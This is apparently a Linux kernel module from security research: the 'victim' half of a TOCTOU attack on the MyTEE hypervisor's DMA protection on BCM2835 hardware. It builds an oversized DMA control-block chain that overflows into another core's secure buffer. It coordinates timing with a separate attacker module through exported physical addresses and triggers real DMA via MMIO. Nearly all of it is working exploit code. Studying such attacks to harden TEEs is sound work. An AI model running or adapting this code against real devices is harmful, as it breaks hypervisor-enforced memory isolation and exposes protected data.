/*
 * MyTEE TOCTOU Attack - Victim Module (runs on Core 0)
 * 
 * This module creates a DMA request with MORE than 128 control blocks,
 * causing buffer overflow into Core 1's secure buffer region.
 *
 * REAL ATTACK: Actually triggers BCM2835 DMA controller via MMIO
 * 
 * Attack mechanism:
 * - Each core has 4KB secure buffer = 128 CBs max (32 bytes each)
 * - Requesting 129+ CBs causes CB[128+] to overflow into Core 1's buffer
 * - DMA follows the CB chain and executes unverified CBs from Core 1
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/smp.h>
#include <linux/slab.h>

#include "toctou_common.h"

#define DRIVER_NAME "toctou_victim"

/* Module parameters */
static int cb_count = OVERFLOW_CB_COUNT;
module_param(cb_count, int, 0644);
MODULE_PARM_DESC(cb_count, "Number of control blocks (>128 causes overflow)");

static int trigger = 0;
module_param(trigger, int, 0644);
MODULE_PARM_DESC(trigger, "Set to 1 to trigger the attack");

static int auto_start = 0;
module_param(auto_start, int, 0644);
MODULE_PARM_DESC(auto_start, "Auto-start victim thread on module load");

static int dma_channel = ATTACK_DMA_CHANNEL;
module_param(dma_channel, int, 0644);
MODULE_PARM_DESC(dma_channel, "DMA channel to use (default: 5)");

/* Timing parameters (microseconds) */
static int timing_ready = DEFAULT_TIMING_READY_US;
module_param(timing_ready, int, 0644);
MODULE_PARM_DESC(timing_ready, "Delay after READY signal (us)");

static int timing_inject = DEFAULT_TIMING_INJECT_US;
module_param(timing_inject, int, 0644);
MODULE_PARM_DESC(timing_inject, "Window for attacker injection (us)");

/* Runtime state */
static void *sync_flag_mem;             /* Dynamically allocated sync memory */
static void __iomem *sync_flag_base;    /* Virtual address for sync flags */
static dma_addr_t sync_flag_phys;       /* Physical address (exported for attacker) */
static void __iomem *dma_base;          /* DMA controller MMIO base */
static struct task_struct *victim_thread;
static volatile int stop_victim = 0;

/* Exported symbols for attacker module */
unsigned long exported_sync_phys = 0;
EXPORT_SYMBOL(exported_sync_phys);

unsigned long exported_verify_phys = 0;
EXPORT_SYMBOL(exported_verify_phys);

/* DMA resources */
static void *src_buf, *dst_buf;
static dma_addr_t src_dma, dst_dma;
static size_t buf_size;

/* Verification buffer - to check if attack CB was executed */
static void *verify_buf;
static dma_addr_t verify_dma;

/* CB chain */
static struct bcm2835_dma_cb *cb_chain;
static dma_addr_t cb_chain_dma;

/* DMA channel register access */
static inline void __iomem *dma_chan_base(int chan)
{
    return dma_base + (chan * BCM2835_DMA_CHAN_SIZE);
}

static inline void dma_write(int chan, u32 reg, u32 val)
{
    writel(val, dma_chan_base(chan) + reg);
}

static inline u32 dma_read(int chan, u32 reg)
{
    return readl(dma_chan_base(chan) + reg);
}

static inline void sync_write(u32 offset, u32 value)
{
    if (sync_flag_base) {
        writel(value, (void *)sync_flag_base + offset);
        wmb();
    }
}

static inline u32 sync_read(u32 offset)
{
    if (sync_flag_base) {
        rmb();
        return readl((void *)sync_flag_base + offset);
    }
    return 0;
}

/*
 * Create CB chain that will overflow into Core 1's buffer
 */
static int create_cb_chain(void)
{
    int i;
    size_t chain_size;

    chain_size = cb_count * sizeof(struct bcm2835_dma_cb);
    
    cb_chain = (void *)__get_free_pages(GFP_KERNEL | GFP_DMA, 
                                         get_order(chain_size));
    if (!cb_chain) {
        pr_err("[VICTIM] Failed to allocate CB chain\n");
        return -ENOMEM;
    }
    cb_chain_dma = virt_to_phys(cb_chain);

    for (i = 0; i < cb_count; i++) {
        struct bcm2835_dma_cb *cb = &cb_chain[i];

        /* Transfer info: source increment, dest increment, wait for response */
        cb->info = BCM2835_DMA_TI_S_INC | BCM2835_DMA_TI_D_INC | 
                   BCM2835_DMA_TI_WAIT_RESP;
        cb->src = PHYS_TO_BUS(src_dma + (i * 32) % buf_size);
        cb->dst = PHYS_TO_BUS(dst_dma + (i * 32) % buf_size);
        cb->length = 32;
        cb->stride = 0;

        if (i < cb_count - 1) {
            cb->next = PHYS_TO_BUS(cb_chain_dma + 
                                   (i + 1) * sizeof(struct bcm2835_dma_cb));
        } else {
            cb->next = 0;  /* End of chain */
        }
    }

    return 0;
}

/*
 * Wait for DMA to complete or timeout
 */
static int wait_dma_complete(int timeout_us)
{
    u32 cs;
    int elapsed = 0;

    while (elapsed < timeout_us) {
        cs = dma_read(dma_channel, BCM2835_DMA_CS);
        
        /* Check if DMA completed (not active and END flag set) */
        if (!(cs & BCM2835_DMA_ACTIVE) && (cs & BCM2835_DMA_END)) {
            return 0;  /* Success */
        }
        
        /* Check for error */
        if (cs & BCM2835_DMA_ERR) {
            pr_err("[VICTIM] DMA error: CS=0x%08x\n", cs);
            return -EIO;
        }

        udelay(1);
        elapsed++;
    }

    return -ETIMEDOUT;
}

/*
 * Trigger REAL DMA transfer - this causes EL2 trap via Stage 2 fault
 */
static void trigger_dma_overflow(void)
{
    u32 result, cs;
    u32 *verify_ptr;
    int dma_result;

    /* Reset result and verification buffer */
    sync_write(SYNC_OFFSET_ATTACK_RESULT, ATTACK_RESULT_NONE);
    verify_ptr = (u32 *)verify_buf;
    *verify_ptr = 0;  /* Clear verification marker */
    wmb();

    /* Signal attacker: about to request DMA */
    sync_write(SYNC_OFFSET_VICTIM_CB_COUNT, cb_count);
    sync_write(SYNC_OFFSET_STATE, SYNC_STATE_VICTIM_READY);
    wmb();

    udelay(timing_ready);

    /* 
     * === REAL DMA TRIGGER ===
     * Writing to CONBLK_AD register triggers Stage 2 fault
     * which traps to EL2 (MyTEE hypervisor)
     */
    
    /* Reset the DMA channel first */
    dma_write(dma_channel, BCM2835_DMA_CS, BCM2835_DMA_RESET);
    udelay(10);

    /* Clear any previous status */
    dma_write(dma_channel, BCM2835_DMA_CS, 
              BCM2835_DMA_END | BCM2835_DMA_INT | BCM2835_DMA_ERR);

    /* Signal: now triggering DMA (will trap to EL2) */
    sync_write(SYNC_OFFSET_STATE, SYNC_STATE_VICTIM_TRAPPED);
    wmb();

    /* 
     * Write CB address to start DMA
     * THIS IS THE CRITICAL WRITE - triggers Stage 2 fault -> EL2 trap
     * EL2 will copy our CB chain to secure buffer (with overflow!)
     */
    dma_write(dma_channel, BCM2835_DMA_CONBLK_AD, PHYS_TO_BUS(cb_chain_dma));
    wmb();

    /* Activate DMA - EL2 should have already processed our CB chain */
    cs = BCM2835_DMA_ACTIVE | BCM2835_DMA_PRIORITY(8) | 
         BCM2835_DMA_PANIC_PRIORITY(15);
    dma_write(dma_channel, BCM2835_DMA_CS, cs);
    wmb();

    /* Wait for DMA completion */
    dma_result = wait_dma_complete(10000);  /* 10ms timeout */

    /* Signal completion */
    sync_write(SYNC_OFFSET_STATE, SYNC_STATE_ATTACK_DONE);

    /* Check DMA result */
    rmb();
    result = sync_read(SYNC_OFFSET_ATTACK_RESULT);
    cs = dma_read(dma_channel, BCM2835_DMA_CS);

    /* Check verification buffer for attack pattern */
    rmb();
    if (*verify_ptr == VERIFY_PATTERN) {
        result = ATTACK_RESULT_VERIFIED;
        sync_write(SYNC_OFFSET_ATTACK_RESULT, result);
    } else if (result == ATTACK_RESULT_INJECTED) {
        result = ATTACK_RESULT_EXECUTED;
        sync_write(SYNC_OFFSET_ATTACK_RESULT, result);
    }

    /* Log result */
    pr_info("[VICTIM] DMA done: CBs=%d, CS=0x%08x, result=%s\n",
            cb_count, cs,
            result == ATTACK_RESULT_VERIFIED ? "VERIFIED" :
            result == ATTACK_RESULT_EXECUTED ? "EXECUTED" :
            result == ATTACK_RESULT_INJECTED ? "INJECTED" : 
            dma_result ? "DMA_ERROR" : "NONE");
}

static int victim_thread_fn(void *data)
{
    int my_core;

    set_cpus_allowed_ptr(current, cpumask_of(0));
    my_core = smp_processor_id();

    pr_info("[VICTIM] Victim thread on Core %d\n", my_core);

    while (!kthread_should_stop() && !stop_victim) {
        if (trigger) {
            trigger = 0;
            trigger_dma_overflow();
        }
        msleep(100);
    }

    return 0;
}

static int __init toctou_victim_init(void)
{
    int ret;

    /* Allocate sync memory dynamically (avoids ioremap issues with RAM) */
    sync_flag_mem = (void *)__get_free_page(GFP_KERNEL | GFP_DMA);
    if (!sync_flag_mem) {
        pr_err("[VICTIM] Failed to allocate sync memory\n");
        return -ENOMEM;
    }
    sync_flag_phys = virt_to_phys(sync_flag_mem);
    sync_flag_base = (void __iomem *)sync_flag_mem;  /* Direct access, not ioremap */
    memset(sync_flag_mem, 0, PAGE_SIZE);
    
    /* Export physical address for attacker module */
    exported_sync_phys = sync_flag_phys;

    /* Map DMA controller registers (this is real MMIO, ioremap is correct) */
    dma_base = ioremap(BCM2835_DMA_BASE, 0x1000);
    if (!dma_base) {
        pr_err("[VICTIM] Failed to map DMA registers\n");
        ret = -ENOMEM;
        goto err_free_sync;
    }

    /* Allocate buffers */
    buf_size = cb_count * 32;
    src_buf = (void *)__get_free_pages(GFP_KERNEL | GFP_DMA, get_order(buf_size));
    dst_buf = (void *)__get_free_pages(GFP_KERNEL | GFP_DMA, get_order(buf_size));
    
    if (!src_buf || !dst_buf) {
        ret = -ENOMEM;
        goto err_free;
    }

    src_dma = virt_to_phys(src_buf);
    dst_dma = virt_to_phys(dst_buf);
    memset(src_buf, 0xAA, buf_size);

    /* Allocate verification buffer */
    verify_buf = (void *)__get_free_pages(GFP_KERNEL | GFP_DMA, 
                                           get_order(VERIFY_BUFFER_SIZE));
    if (!verify_buf) {
        ret = -ENOMEM;
        goto err_free;
    }
    verify_dma = virt_to_phys(verify_buf);
    memset(verify_buf, 0, VERIFY_BUFFER_SIZE);
    
    /* Export for attacker module */
    exported_verify_phys = verify_dma;

    /* Create CB chain */
    ret = create_cb_chain();
    if (ret)
        goto err_free_verify;

    /* Start thread if auto_start */
    if (auto_start) {
        victim_thread = kthread_run(victim_thread_fn, NULL, "toctou_victim");
        if (IS_ERR(victim_thread)) {
            ret = PTR_ERR(victim_thread);
            victim_thread = NULL;
            goto err_free_cb;
        }
    }

    pr_info("[VICTIM] Loaded: cb=%d, overflow=%d, chan=%d, sync=0x%lx, verify=0x%llx\n",
            cb_count, cb_count - MAX_CBS_PER_CORE, dma_channel,
            exported_sync_phys, (unsigned long long)verify_dma);
    return 0;

err_free_cb:
    if (cb_chain)
        free_pages((unsigned long)cb_chain, 
                   get_order(cb_count * sizeof(struct bcm2835_dma_cb)));
err_free_verify:
    if (verify_buf)
        free_pages((unsigned long)verify_buf, get_order(VERIFY_BUFFER_SIZE));
err_free:
    if (src_buf)
        free_pages((unsigned long)src_buf, get_order(buf_size));
    if (dst_buf)
        free_pages((unsigned long)dst_buf, get_order(buf_size));
    if (dma_base)
        iounmap(dma_base);
err_free_sync:
    if (sync_flag_mem)
        free_page((unsigned long)sync_flag_mem);
    return ret;
}

static void __exit toctou_victim_exit(void)
{
    stop_victim = 1;

    if (victim_thread)
        kthread_stop(victim_thread);

    if (cb_chain)
        free_pages((unsigned long)cb_chain,
                   get_order(cb_count * sizeof(struct bcm2835_dma_cb)));

    if (verify_buf)
        free_pages((unsigned long)verify_buf, get_order(VERIFY_BUFFER_SIZE));

    if (src_buf)
        free_pages((unsigned long)src_buf, get_order(buf_size));
    if (dst_buf)
        free_pages((unsigned long)dst_buf, get_order(buf_size));

    if (dma_base)
        iounmap(dma_base);
    if (sync_flag_mem)
        free_page((unsigned long)sync_flag_mem);

    pr_info("[VICTIM] Unloaded\n");
}

module_init(toctou_victim_init);
module_exit(toctou_victim_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Security Research");
MODULE_DESCRIPTION("MyTEE TOCTOU Attack - Victim Module");
